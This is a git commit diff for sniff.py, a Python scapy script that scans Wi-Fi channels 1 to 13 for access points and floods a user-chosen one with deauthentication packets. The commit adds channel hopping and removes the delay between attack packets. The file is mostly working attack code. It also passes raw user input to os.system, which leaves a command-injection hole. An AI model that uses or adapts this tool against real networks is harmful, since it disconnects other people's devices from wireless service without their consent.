b1848a686b630ab626dc12dc7778d733b5553f7a
JiByungKyu <gub122@naver.com>
2016-12-17 08:13:43 -0500

    final

--- sniff.py
+++ sniff.py
@@ -1,4 +1,5 @@
 from scapy.all import *
+import os
 import time
 ap_list = []
 no_ap=0
@@ -9,23 +10,24 @@ def PacketHandler(pkt):
 		if pkt.type==0 and pkt.subtype==8 :
 			if pkt.addr2 not in ap_list:
 				ap_list.append(pkt.addr2)
-				print "%d AP MAC:%s with SSID: %s " %(no_ap,pkt.addr2,pkt.info)
+				print "%d AP MAC:%s with SSID: %s" %(no_ap,pkt.addr2,pkt.info)
 				no_ap=no_ap+1
 def deauth_ap(bssid,number):
 	packet=RadioTap()/Dot11(type=0,subtype=12,addr1=broadcast,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
-	test_pack=RadioTap()/Dot11(type=0,subtype=12,addr1=broadcast,addr2=broadcast,addr3=broadcast)/Dot11Deauth(reason=7)
 	for n in range(number):
 		sendp(packet)
-		time.sleep(20)
 
 def main():
-	interface=raw_input("Name of interface \t")
-	cnt=input("Number of packet to sniff \t")
-	sniff(iface=interface,prn=PacketHandler,count=cnt)
-	choice_ap=input("AP to attack \t")
-	attack_no=input("number of packet to attack \t")
-	print("Attack to "+ap_list[choice_ap])
-	deauth_ap(ap_list[choice_ap],attack_no)
+	interface=raw_input("Name of interface : ")
+	cnt=input("Number of packet to sniff : ")
+	for channel in range(1,14):
+		os.system("iwconfig "+interface+" channel "+str(channel))
+		print "Snifiing on channel"+str(channel)	
+		sniff(iface=interface,prn=PacketHandler,count=cnt)
+		choice_ap=input("AP to attack : ")
+		attack_no=input("number of packet to attack : ")
+		print("Attack to "+ap_list[choice_ap])
+		deauth_ap(ap_list[choice_ap],attack_no)
 	
 
 if __name__== "__main__":
